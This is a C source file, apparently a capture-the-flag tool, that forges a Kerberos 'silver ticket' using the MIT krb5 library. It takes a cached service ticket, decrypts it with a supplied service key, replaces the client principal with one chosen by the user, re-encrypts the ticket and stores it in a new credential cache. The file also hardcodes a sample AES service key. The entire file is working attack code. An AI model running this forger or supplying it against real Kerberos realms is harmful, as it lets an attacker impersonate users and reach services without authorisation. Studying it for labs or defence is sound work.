/*
 * ctf ticketer for mit ccache
 */

#include <com_err.h>
#include <krb5.h>
#include <stdio.h>
#include <string.h>

#define SERVICE_KEY "9c008f673b0c34d28ff483587f77ddb76f35545fcc69a0ae709f16f20e8765ee"
#define NEW_PRINC "client1"

// k5-int.h
krb5_error_code decode_krb5_enc_tkt_part(const krb5_data *output, krb5_enc_tkt_part **rep);
krb5_error_code encode_krb5_enc_tkt_part(const krb5_enc_tkt_part *rep, krb5_data **code);
void KRB5_CALLCONV krb5_free_enc_tkt_part(krb5_context, krb5_enc_tkt_part *);
krb5_error_code encode_krb5_ticket(const krb5_ticket *rep, krb5_data **code);

krb5_context context;

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

uint8_t *datahex(char *string) {
    size_t slength = 0;
    size_t dlength = 0;
    uint8_t *data = NULL;
    size_t index = 0;
    char c;
    int value = 0;

    if (string == NULL)
        return NULL;

    slength = strlen(string);
    if ((slength % 2) != 0) // must be even
        return NULL;

    dlength = slength / 2;

    data = malloc(dlength);
    memset(data, 0, dlength);

    index = 0;
    while (index < slength) {
        c = string[index];
        value = 0;
        if (c >= '0' && c <= '9')
            value = (c - '0');
        else if (c >= 'A' && c <= 'F')
            value = (10 + (c - 'A'));
        else if (c >= 'a' && c <= 'f')
            value = (10 + (c - 'a'));
        else {
            free(data);
            return NULL;
        }

        data[(index / 2)] += value << (((index + 1) % 2) * 4);

        index++;
    }

    return data;
}

/*
 * read one credential from default cache
 */
void get_creds(krb5_creds *out_creds) {
    krb5_ccache cache;
    krb5_principal princ;
    char *princ_name;
    krb5_cc_cursor cur;

    krb5_cc_default(context, &cache);
    krb5_cc_get_principal(context, cache, &princ);
    krb5_unparse_name(context, princ, &princ_name);
    krb5_free_principal(context, princ);
    printf("Ticket cache: %s:%s\nDefault principal: %s\n\n", krb5_cc_get_type(context, cache), krb5_cc_get_name(context, cache), princ_name);
    krb5_free_unparsed_name(context, princ_name);

    // get credential, expects only one "service for service" credential to be mangled
    krb5_cc_start_seq_get(context, cache, &cur);
    krb5_cc_next_cred(context, cache, &cur, out_creds);
    krb5_cc_end_seq_get(context, cache, &cur);
    krb5_cc_close(context, cache);

    printf("creds session key:\n");
    hexdump(out_creds->keyblock.contents, out_creds->keyblock.length);

    return;
}

/*
 * generate new ticket krb5_data from the template
 */
void customize_ticket(krb5_creds *creds, krb5_keyblock *key, krb5_principal *new_princ, krb5_data **out_ticket) {
    krb5_ticket *tkt = NULL;
    krb5_data scratch;
    krb5_data *scratch2 = NULL;
    krb5_enc_tkt_part *dec_tkt_part = NULL;

    krb5_decode_ticket(&creds->ticket, &tkt);
    scratch.length = tkt->enc_part.ciphertext.length;
    scratch.data = malloc(tkt->enc_part.ciphertext.length);
    krb5_c_decrypt(context, key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, &tkt->enc_part, &scratch);
    decode_krb5_enc_tkt_part(&scratch, &dec_tkt_part);
    krb5_free_data_contents(context, &scratch);

    printf("decrypted ticket session key:\n");
    hexdump(dec_tkt_part->session->contents, dec_tkt_part->session->length);

    krb5_free_principal(context, dec_tkt_part->client);
    krb5_copy_principal(context, *new_princ, &dec_tkt_part->client);

    encode_krb5_enc_tkt_part(dec_tkt_part, &scratch2);
    krb5_c_encrypt(context, key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, scratch2, &tkt->enc_part);
    encode_krb5_ticket(tkt, out_ticket);
    krb5_free_data(context, scratch2);

    krb5_free_enc_tkt_part(context, dec_tkt_part);
    krb5_free_ticket(context, tkt);

    return;
}

/*
 * update credential principal and ticket
 */
void customize_creds(krb5_creds *creds, krb5_principal *new_princ, krb5_data *new_ticket) {

    krb5_free_data_contents(context, &creds->ticket);
    creds->ticket = *new_ticket;
    krb5_free_principal(context, creds->client);
    krb5_copy_principal(context, *new_princ, &creds->client);

    return;
}

/*
 * save creds to disk
 */
void save_creds(krb5_creds *creds) {
    krb5_ccache new_cache;

    krb5_cc_new_unique(context, "FILE", NULL, &new_cache);
    printf("new cache name: %s\n", krb5_cc_get_name(context, new_cache));
    krb5_cc_initialize(context, new_cache, creds->client);
    krb5_cc_store_cred(context, new_cache, creds);
    krb5_cc_close(context, new_cache);
}

/*
 * create silver ticket from TGS
 */
int main(int argc, char *argv[]) {
    char *progname;
    krb5_keyblock srv_key;
    krb5_principal new_princ;
    krb5_creds creds;
    krb5_data *new_ticket = NULL;

    progname = argv[0];

    krb5_init_context(&context);

    // prepare args
    srv_key.enctype = 18;
    srv_key.contents = (krb5_octet *)datahex(argv[1]);
    srv_key.length = strlen(argv[1]) / 2;
    krb5_parse_name(context, argv[2], &new_princ);

    get_creds(&creds);
    customize_ticket(&creds, &srv_key, &new_princ, &new_ticket);
    customize_creds(&creds, &new_princ, new_ticket);
    free(new_ticket); // must not free ticket contents here as it's swapped into creds
    save_creds(&creds);

    // cleanup
    krb5_free_cred_contents(context, &creds);
    krb5_free_principal(context, new_princ);
    krb5_free_keyblock_contents(context, &srv_key);

    krb5_free_context(context);

    exit(0);
}
